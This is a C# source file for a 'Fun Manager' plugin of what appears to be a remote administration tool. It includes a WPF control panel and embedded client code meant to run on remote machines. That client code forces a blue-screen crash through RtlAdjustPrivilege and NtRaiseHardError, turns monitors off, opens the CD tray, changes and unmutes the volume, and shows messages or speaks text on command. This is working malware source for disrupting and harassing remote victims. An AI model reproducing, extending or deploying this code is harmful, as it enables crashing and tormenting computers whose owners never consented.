using System;
using System.Collections.Concurrent;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using WpfApp.Plugins;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class FunPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, FunPluginUI> _clientUIs = new();

        public string PluginId => "fun";
        public string DisplayName => "Fun Manager";
        public string Version => "1.0.0";
        public string Description => "Remote fun controls: BSOD, monitor, CD tray, volume, message box, and text-to-speech.";

        // Opcodes
        private const byte OP_BSOD = 0x00;
        private const byte OP_MESSAGEBOX = 0x01;
        private const byte OP_CD_OPEN = 0x03;
        private const byte OP_CD_CLOSE = 0x04;
        private const byte OP_MONITOR_OFF = 0x05;
        private const byte OP_MONITOR_ON = 0x06;
        private const byte OP_SET_VOLUME = 0x07;
        private const byte OP_TTS = 0x08;

        // Client -> Server
        private const byte CLIENT_READY = 0xFE;
        private const byte CLIENT_ACK = 0x01;
        private const byte CLIENT_ERROR = 0x02;

        public Task Initialize(PluginHost host)
        {
            _host = host;
            _host.Log("[FUN] Plugin initialized");
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_fun
{
    [ComImport]
    [Guid(""5CDF2C82-841E-4546-9722-0CF74078229A""), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioEndpointVolume
    {
        int f(); int g(); int h(); int i();
        int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
        int j();
        int GetMasterVolumeLevelScalar(out float pfLevel);
        int k(); int l(); int m(); int n();
        int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
        int GetMute(out bool pbMute);
    }

    [ComImport]
    [Guid(""D666063F-1587-4E43-81F1-B948E807363F"")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDevice
    {
        [PreserveSig]
        int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, [Out, MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
    }

    [ComImport]
    [Guid(""A95664D2-9614-4F35-A746-DE8DB63617E6""), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDeviceEnumerator
    {
        int f();
        [PreserveSig]
        int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
    }

    [ComImport]
    [Guid(""BCDE0395-E52F-467C-8E3D-C4579291692E"")]
    class MMDeviceEnumeratorComObject { }

    public class Main
    {
        [DllImport(""ntdll.dll"")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        [DllImport(""ntdll.dll"")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        [DllImport(""winmm.dll"")]
        private static extern uint mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hWndCallback);
        [DllImport(""user32.dll"", CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

        private const int HWND_BROADCAST = 0xffff;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MONITORPOWER = 0xF170;

        private Func<byte[], Task> _send;
        private Func<Task<byte[]>> _receive;

        public async Task Run(Func<byte[], Task> send, Func<Task<byte[]>> receive)
        {
            _send = send;
            _receive = receive;

            await _send(new byte[] { 0xFE });

            while (true)
            {
                byte[] data = await _receive();
                if (data == null || data.Length == 0) break;

                byte opcode = data[0];
                byte[] payload = null;
                if (data.Length > 1)
                {
                    payload = new byte[data.Length - 1];
                    Buffer.BlockCopy(data, 1, payload, 0, payload.Length);
                }

                byte[] responseToSend = null;

                try
                {
                    switch (opcode)
                    {
                        case 0x00:
                            BlueScreen();
                            break;
                        case 0x01:
                            if (payload != null)
                            {
                                string text = Encoding.UTF8.GetString(payload);
                                ThreadPool.QueueUserWorkItem(_ =>
                                {
                                    try
                                    {
                                        System.Windows.Forms.MessageBox.Show(text, ""Message"",
                                            System.Windows.Forms.MessageBoxButtons.OK,
                                            System.Windows.Forms.MessageBoxIcon.None,
                                            System.Windows.Forms.MessageBoxDefaultButton.Button1,
                                            (System.Windows.Forms.MessageBoxOptions)0x40000);
                                    }
                                    catch { }
                                });
                            }
                            break;
                        case 0x03:
                            mciSendString(""set cdaudio door open"", null, 0, IntPtr.Zero);
                            break;
                        case 0x04:
                            mciSendString(""set cdaudio door close"", null, 0, IntPtr.Zero);
                            break;
                        case 0x05:
                            SendMessage((IntPtr)HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
                            break;
                        case 0x06:
                            SendMessage((IntPtr)HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
                            break;
                        case 0x07:
                            if (payload != null && payload.Length >= 1)
                                SetVolume(payload[0]);
                            break;
                        case 0x08:
                            if (payload != null)
                            {
                                string ttsText = Encoding.UTF8.GetString(payload);
                                ThreadPool.QueueUserWorkItem(_ =>
                                {
                                    try
                                    {
                                        using (var synth = new SpeechSynthesizer())
                                        {
                                            synth.SetOutputToDefaultAudioDevice();
                                            synth.Speak(ttsText);
                                        }
                                    }
                                    catch { }
                                });
                            }
                            break;
                    }
                    responseToSend = new byte[] { 0x01, opcode };
                }
                catch (Exception ex)
                {
                    byte[] errBytes = Encoding.UTF8.GetBytes(ex.Message);
                    responseToSend = new byte[2 + errBytes.Length];
                    responseToSend[0] = 0x02;
                    responseToSend[1] = opcode;
                    Buffer.BlockCopy(errBytes, 0, responseToSend, 2, errBytes.Length);
                }

                if (responseToSend != null)
                {
                    try { await _send(responseToSend); } catch { }
                }
            }
        }

        private void BlueScreen()
        {
            bool tmp1;
            RtlAdjustPrivilege(19, true, false, out tmp1);
            uint tmp2;
            NtRaiseHardError(0xC0140002, 0, 0, IntPtr.Zero, 6, out tmp2);
        }

        private void SetVolume(int vol)
        {
            const int eRender = 0;
            const int eMultimedia = 1;
            var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
            IMMDevice dev = null;
            Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(eRender, eMultimedia, out dev));
            object epv_obj = null;
            var epvid = new Guid(""5CDF2C82-841E-4546-9722-0CF74078229A"");
            Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, 0, IntPtr.Zero, out epv_obj));
            var epv = epv_obj as IAudioEndpointVolume;
            Guid guid = Guid.Empty;
            epv.SetMasterVolumeLevelScalar((float)vol / 100f, guid);
            bool isMuted;
            epv.GetMute(out isMuted);
            if (isMuted) epv.SetMute(false, guid);
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            var ui = new FunPluginUI(context, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;

            if (_clientUIs.TryGetValue(clientId, out var ui))
            {
                byte indicator = data[0];

                switch (indicator)
                {
                    case CLIENT_READY:
                        ui.OnClientReady();
                        _host.Log($"[FUN] Client {clientId} ready");
                        break;
                    case CLIENT_ACK:
                        if (data.Length >= 2)
                        {
                            ui.OnCommandAck(data[1]);
                            _host.Log($"[FUN] Client {clientId} completed 0x{data[1]:X2}");
                        }
                        break;
                    case CLIENT_ERROR:
                        if (data.Length >= 2)
                        {
                            string error = data.Length > 2 ? Encoding.UTF8.GetString(data, 2, data.Length - 2) : "Unknown";
                            ui.OnCommandError(data[1], error);
                            _host.Log($"[FUN] Client {clientId} error on 0x{data[1]:X2}: {error}");
                        }
                        break;
                }
            }

            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui))
            {
                ui.OnDisconnected();
                ui.Dispose();
            }
            _host.Log($"[FUN] Client {clientId} disconnected");
            return Task.CompletedTask;
        }

        // ==================== COMMAND SENDERS ====================

        public void SendBSOD(string clientId) => SendCommand(clientId, OP_BSOD, null);
        public void SendMessageBox(string clientId, string text) => SendCommand(clientId, OP_MESSAGEBOX, Encoding.UTF8.GetBytes(text));
        public void SendCDOpen(string clientId) => SendCommand(clientId, OP_CD_OPEN, null);
        public void SendCDClose(string clientId) => SendCommand(clientId, OP_CD_CLOSE, null);
        public void SendMonitorOff(string clientId) => SendCommand(clientId, OP_MONITOR_OFF, null);
        public void SendMonitorOn(string clientId) => SendCommand(clientId, OP_MONITOR_ON, null);
        public void SendSetVolume(string clientId, int volume) => SendCommand(clientId, OP_SET_VOLUME, new byte[] { (byte)Math.Clamp(volume, 0, 100) });
        public void SendTTS(string clientId, string text) => SendCommand(clientId, OP_TTS, Encoding.UTF8.GetBytes(text));

        private void SendCommand(string clientId, byte opcode, byte[] payload)
        {
            int payloadLen = payload?.Length ?? 0;
            byte[] data = new byte[1 + payloadLen];
            data[0] = opcode;
            if (payload != null && payload.Length > 0)
                Buffer.BlockCopy(payload, 0, data, 1, payload.Length);

            _host.SendPluginDataToClient(clientId, PluginId, data);
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
        }
    }

    // ==================== UI ====================

    [SupportedOSPlatform("windows")]
    public class FunPluginUI : UserControl, IDisposable
    {
        // Theme colors matching MainWindow
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        Color BackgroundColorVal => C("BackgroundColor");
        Color SurfaceColorVal => C("SurfaceColor");
        Color SurfaceLightColorVal => C("SurfaceLightColor");
        Color BorderColorVal => C("BorderColor");
        Color TextPrimaryColorVal => C("TextPrimaryColor");
        Color TextSecondaryColorVal => C("TextSecondaryColor");
        Color PrimaryColorVal => C("PrimaryColor");
        Color PrimaryHoverColorVal => C("PrimaryHoverColor");
        Color DangerColorVal => C("DangerColor");
        Color DangerHoverColorVal => C("DangerHoverColor");
        Color SuccessColorVal => C("SuccessColor");
        Color WarningColorVal => C("WarningColor");
        Color DisabledBgColorVal => C("ButtonBgColor");
        Color ButtonBorderClr => C("ButtonBorderColor");

        SolidColorBrush BackgroundBrush => B("BackgroundBrush");
        SolidColorBrush SurfaceBrush => B("SurfaceBrush");
        SolidColorBrush SurfaceLightBrush => B("SurfaceLightBrush");
        SolidColorBrush BorderBrushColor => B("BorderBrush");
        SolidColorBrush TextPrimaryBrush => B("TextPrimaryBrush");
        SolidColorBrush TextSecondaryBrush => B("TextSecondaryBrush");
        SolidColorBrush DisabledBgBrush => B("ButtonBgBrush");

        private readonly PluginContext _context;
        private readonly FunPlugin _plugin;
        private readonly TextBlock _statusLabel;
        private readonly TextBlock _logText;
        private readonly ScrollViewer _logScroll;
        private bool _clientReady;

        // Controls that need enable/disable
        private readonly System.Collections.Generic.List<Button> _commandButtons = new();

        public FunPluginUI(PluginContext context, FunPlugin plugin)
        {
            _context = context;
            _plugin = plugin;

            Background = BackgroundBrush;

            var mainGrid = new Grid();
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Auto) });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(150) });

            // ===== Top toolbar =====
            var toolbar = new Border
            {
                Background = SurfaceBrush,
                BorderBrush = BorderBrushColor,
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(12, 8, 12, 8)
            };

            var toolbarPanel = new StackPanel { Orientation = Orientation.Horizontal };

            _statusLabel = new TextBlock
            {
                Text = $"{TruncateId(context.ClientId)} — Waiting for client...",
                Foreground = TextSecondaryBrush,
                VerticalAlignment = VerticalAlignment.Center,
                FontSize = 12
            };
            toolbarPanel.Children.Add(_statusLabel);

            toolbar.Child = toolbarPanel;
            Grid.SetRow(toolbar, 0);
            mainGrid.Children.Add(toolbar);

            // ===== Controls area =====
            var controlsScroll = new ScrollViewer
            {
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                HorizontalScrollBarVisibility = ScrollBarVisibility.Disabled,
                Padding = new Thickness(16, 12, 16, 12)
            };

            var controlsPanel = new StackPanel();

            // --- System section ---
            controlsPanel.Children.Add(CreateSectionHeader("System"));
            controlsPanel.Children.Add(MakeSeparator());

            var sysRow = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 0, 0, 12) };

            var bsodBtn = CreateThemedButton("BSOD", DangerColorVal, DangerHoverColorVal);
            bsodBtn.Click += (s, e) =>
            {
                if (!_clientReady) return;
                if (MessageBox.Show("Send BSOD? This will crash the remote machine immediately.",
                    "Confirm BSOD", MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes)
                {
                    _plugin.SendBSOD(_context.ClientId);
                    AppendLog("BSOD sent");
                }
            };
            sysRow.Children.Add(bsodBtn);
            _commandButtons.Add(bsodBtn);

            var monOffBtn = CreateThemedButton("Monitor Off", SurfaceLightColorVal, C("ButtonBgHoverColor"));
            monOffBtn.Click += (s, e) =>
            {
                if (!_clientReady) return;
                _plugin.SendMonitorOff(_context.ClientId);
                AppendLog("Monitor Off sent");
            };
            sysRow.Children.Add(monOffBtn);
            _commandButtons.Add(monOffBtn);

            var monOnBtn = CreateThemedButton("Monitor On", SurfaceLightColorVal, C("ButtonBgHoverColor"));
            monOnBtn.Click += (s, e) =>
            {
                if (!_clientReady) return;
                _plugin.SendMonitorOn(_context.ClientId);
                AppendLog("Monitor On sent");
            };
            sysRow.Children.Add(monOnBtn);
            _commandButtons.Add(monOnBtn);

            controlsPanel.Children.Add(sysRow);

            // --- CD-ROM section ---
            controlsPanel.Children.Add(CreateSectionHeader("CD-ROM"));
            controlsPanel.Children.Add(MakeSeparator());

            var cdRow = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 0, 0, 12) };

            var cdOpenBtn = CreateThemedButton("Open CD", SurfaceLightColorVal, C("ButtonBgHoverColor"));
            cdOpenBtn.Click += (s, e) =>
            {
                if (!_clientReady) return;
                _plugin.SendCDOpen(_context.ClientId);
                AppendLog("CD Open sent");
            };
            cdRow.Children.Add(cdOpenBtn);
            _commandButtons.Add(cdOpenBtn);

            var cdCloseBtn = CreateThemedButton("Close CD", SurfaceLightColorVal, C("ButtonBgHoverColor"));
            cdCloseBtn.Click += (s, e) =>
            {
                if (!_clientReady) return;
                _plugin.SendCDClose(_context.ClientId);
                AppendLog("CD Close sent");
            };
            cdRow.Children.Add(cdCloseBtn);
            _commandButtons.Add(cdCloseBtn);

            controlsPanel.Children.Add(cdRow);

            // --- Volume section ---
            controlsPanel.Children.Add(CreateSectionHeader("Volume"));
            controlsPanel.Children.Add(MakeSeparator());

            var volPanel = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 0, 0, 12) };

            var volSlider = new Slider
            {
                Width = 220,
                Minimum = 0,
                Maximum = 100,
                Value = 50,
                VerticalAlignment = VerticalAlignment.Center,
                TickFrequency = 5,
                IsSnapToTickEnabled = true
            };

            var volLabel = new TextBlock
            {
                Text = "50%",
                Foreground = TextPrimaryBrush,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(10, 0, 10, 0),
                Width = 40,
                FontSize = 13
            };
            volSlider.ValueChanged += (s, e) => { volLabel.Text = $"{(int)volSlider.Value}%"; };

            var volBtn = CreateThemedButton("Set Volume", PrimaryColorVal, PrimaryHoverColorVal);
            volBtn.Click += (s, e) =>
            {
                if (!_clientReady) return;
                _plugin.SendSetVolume(_context.ClientId, (int)volSlider.Value);
                AppendLog($"Volume set to {(int)volSlider.Value}%");
            };
            _commandButtons.Add(volBtn);

            volPanel.Children.Add(volSlider);
            volPanel.Children.Add(volLabel);
            volPanel.Children.Add(volBtn);
            controlsPanel.Children.Add(volPanel);

            // --- MessageBox section ---
            controlsPanel.Children.Add(CreateSectionHeader("Message Box"));
            controlsPanel.Children.Add(MakeSeparator());

            var msgPanel = new DockPanel { Margin = new Thickness(0, 0, 0, 12) };

            var msgBtn = CreateThemedButton("Send", PrimaryColorVal, PrimaryHoverColorVal);
            msgBtn.Margin = new Thickness(8, 0, 0, 0);
            DockPanel.SetDock(msgBtn, Dock.Right);
            _commandButtons.Add(msgBtn);

            var msgBox = CreateThemedTextBox();
            msgBox.KeyDown += (s, e) =>
            {
                if (e.Key == Key.Enter && _clientReady)
                {
                    string text = msgBox.Text.Trim();
                    if (!string.IsNullOrEmpty(text))
                    {
                        _plugin.SendMessageBox(_context.ClientId, text);
                        AppendLog($"MessageBox sent: \"{text}\"");
                        msgBox.Clear();
                    }
                    e.Handled = true;
                }
            };

            msgBtn.Click += (s, e) =>
            {
                if (!_clientReady) return;
                string text = msgBox.Text.Trim();
                if (string.IsNullOrEmpty(text)) return;
                _plugin.SendMessageBox(_context.ClientId, text);
                AppendLog($"MessageBox sent: \"{text}\"");
                msgBox.Clear();
            };

            msgPanel.Children.Add(msgBtn);
            msgPanel.Children.Add(msgBox);
            controlsPanel.Children.Add(msgPanel);

            // --- TTS section ---
            controlsPanel.Children.Add(CreateSectionHeader("Text-to-Speech"));
            controlsPanel.Children.Add(MakeSeparator());

            var ttsPanel = new DockPanel { Margin = new Thickness(0, 0, 0, 12) };

            var ttsBtn = CreateThemedButton("Speak", new Color { R = 0, G = 128, B = 128, A = 255 }, new Color { R = 0, G = 105, B = 105, A = 255 });
            ttsBtn.Margin = new Thickness(8, 0, 0, 0);
            DockPanel.SetDock(ttsBtn, Dock.Right);
            _commandButtons.Add(ttsBtn);

            var ttsBox = CreateThemedTextBox();
            ttsBox.KeyDown += (s, e) =>
            {
                if (e.Key == Key.Enter && _clientReady)
                {
                    string text = ttsBox.Text.Trim();
                    if (!string.IsNullOrEmpty(text))
                    {
                        _plugin.SendTTS(_context.ClientId, text);
                        AppendLog($"TTS sent: \"{text}\"");
                        ttsBox.Clear();
                    }
                    e.Handled = true;
                }
            };

            ttsBtn.Click += (s, e) =>
            {
                if (!_clientReady) return;
                string text = ttsBox.Text.Trim();
                if (string.IsNullOrEmpty(text)) return;
                _plugin.SendTTS(_context.ClientId, text);
                AppendLog($"TTS sent: \"{text}\"");
                ttsBox.Clear();
            };

            ttsPanel.Children.Add(ttsBtn);
            ttsPanel.Children.Add(ttsBox);
            controlsPanel.Children.Add(ttsPanel);

            controlsScroll.Content = controlsPanel;
            Grid.SetRow(controlsScroll, 1);
            mainGrid.Children.Add(controlsScroll);

            // ===== Log area =====
            var logBorder = new Border
            {
                Background = SurfaceBrush,
                BorderBrush = BorderBrushColor,
                BorderThickness = new Thickness(0, 1, 0, 0)
            };

            var logGrid = new Grid();
            logGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Auto) });
            logGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });

            var logHeader = new TextBlock
            {
                Text = "Activity Log",
                FontSize = 12,
                FontWeight = FontWeights.SemiBold,
                Foreground = TextSecondaryBrush,
                Margin = new Thickness(12, 6, 12, 4)
            };
            Grid.SetRow(logHeader, 0);
            logGrid.Children.Add(logHeader);

            _logScroll = new ScrollViewer
            {
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                HorizontalScrollBarVisibility = ScrollBarVisibility.Disabled,
                Padding = new Thickness(12, 0, 12, 8)
            };

            _logText = new TextBlock
            {
                Foreground = TextSecondaryBrush,
                FontFamily = new FontFamily("Cascadia Mono, Consolas, 'Courier New', monospace"),
                FontSize = 11,
                TextWrapping = TextWrapping.Wrap
            };

            _logScroll.Content = _logText;
            Grid.SetRow(_logScroll, 1);
            logGrid.Children.Add(_logScroll);

            logBorder.Child = logGrid;
            Grid.SetRow(logBorder, 2);
            mainGrid.Children.Add(logBorder);

            Content = mainGrid;

            // Start with buttons disabled
            SetButtonsEnabled(false);
            AppendLog("Waiting for client plugin to load...");
        }

        // ==================== CLIENT EVENTS ====================

        public void OnClientReady()
        {
            Dispatcher.BeginInvoke(() =>
            {
                _clientReady = true;
                SetButtonsEnabled(true);
                _statusLabel.Text = $"{TruncateId(_context.ClientId)} — Ready";
                _statusLabel.Foreground = new SolidColorBrush(SuccessColorVal);
                AppendLog("Client plugin ready. All controls enabled.");
            });
        }

        public void OnCommandAck(byte opcode)
        {
            Dispatcher.BeginInvoke(() =>
            {
                string cmdName = GetOpcodeName(opcode);
                AppendLog($"? {cmdName} completed");
            });
        }

        public void OnCommandError(byte opcode, string error)
        {
            Dispatcher.BeginInvoke(() =>
            {
                string cmdName = GetOpcodeName(opcode);
                AppendLog($"? {cmdName} failed: {error}");
            });
        }

        public void OnDisconnected()
        {
            Dispatcher.BeginInvoke(() =>
            {
                _clientReady = false;
                SetButtonsEnabled(false);
                _statusLabel.Text = $"{TruncateId(_context.ClientId)} — Disconnected";
                _statusLabel.Foreground = new SolidColorBrush(DangerColorVal);
                AppendLog("Client disconnected.");
            });
        }

        // ==================== HELPERS ====================

        private void SetButtonsEnabled(bool enabled)
        {
            foreach (var btn in _commandButtons)
                btn.IsEnabled = enabled;
        }

        private void AppendLog(string message)
        {
            Dispatcher.BeginInvoke(() =>
            {
                string timestamp = DateTime.Now.ToString("HH:mm:ss");
                string line = $"[{timestamp}] {message}\n";
                _logText.Text += line;

                // Cap log length
                if (_logText.Text.Length > 10000)
                    _logText.Text = _logText.Text.Substring(_logText.Text.Length - 8000);

                _logScroll.ScrollToEnd();
            });
        }

        private static string GetOpcodeName(byte opcode)
        {
            return opcode switch
            {
                0x00 => "BSOD",
                0x01 => "MessageBox",
                0x03 => "CD Open",
                0x04 => "CD Close",
                0x05 => "Monitor Off",
                0x06 => "Monitor On",
                0x07 => "Set Volume",
                0x08 => "TTS",
                _ => $"Command 0x{opcode:X2}"
            };
        }

        private static string TruncateId(string id)
        {
            if (string.IsNullOrEmpty(id)) return "";
            return id.Length <= 16 ? id : id.Substring(0, 16) + "…";
        }

        private TextBox CreateThemedTextBox()
        {
            return new TextBox
            {
                Background = new SolidColorBrush(C("BackgroundColor")),
                Foreground = new SolidColorBrush(C("TextPrimaryColor")),
                BorderBrush = new SolidColorBrush(C("BorderColor")),
                BorderThickness = new Thickness(1),
                Padding = new Thickness(8, 5, 8, 5),
                CaretBrush = new SolidColorBrush(C("TextPrimaryColor")),
                FontSize = 13,
                VerticalContentAlignment = VerticalAlignment.Center
            };
        }

        private Button CreateThemedButton(string text, Color normalBg, Color hoverBg)
        {
            var nb = new SolidColorBrush(normalBg); var hb = new SolidColorBrush(hoverBg);
            var bb = new SolidColorBrush(C("ButtonBorderColor")); var db = new SolidColorBrush(C("ButtonBgColor"));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
            var p = new Trigger { Property = System.Windows.Controls.Primitives.ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(d);
            return new Button { Content = text, Template = tp, Foreground = new SolidColorBrush(C("TextPrimaryColor")), Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        private TextBlock CreateSectionHeader(string text)
        {
            return new TextBlock
            {
                Text = text,
                FontSize = 13,
                FontWeight = FontWeights.SemiBold,
                Foreground = TextSecondaryBrush,
                Margin = new Thickness(0, 8, 0, 4)
            };
        }

        private Border MakeSeparator()
        {
            return new Border { Height = 1, Background = new SolidColorBrush(C("ButtonBorderColor")), Margin = new Thickness(0, 0, 0, 8) };
        }

        public void Dispose() { }
    }
}